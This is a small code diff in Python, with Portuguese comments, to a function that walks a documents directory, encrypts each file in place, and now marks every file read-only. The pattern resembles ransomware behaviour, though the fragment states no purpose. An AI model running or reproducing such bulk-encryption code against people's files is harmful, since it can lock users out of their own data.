@@ -26,3 +26,5 @@ def encrypt_documents_directory():
         for file in files:
             file_path = os.path.join(root, file)  # Obtém o caminho completo do arquivo
             encrypt_file(file_path, key)  # Encripta o arquivo
+            # Define as permissões do arquivo como somente leitura para o usuário
+            os.chmod(file_path, 0o444)  # 0o444 representa permissões de leitura para todos os usuários
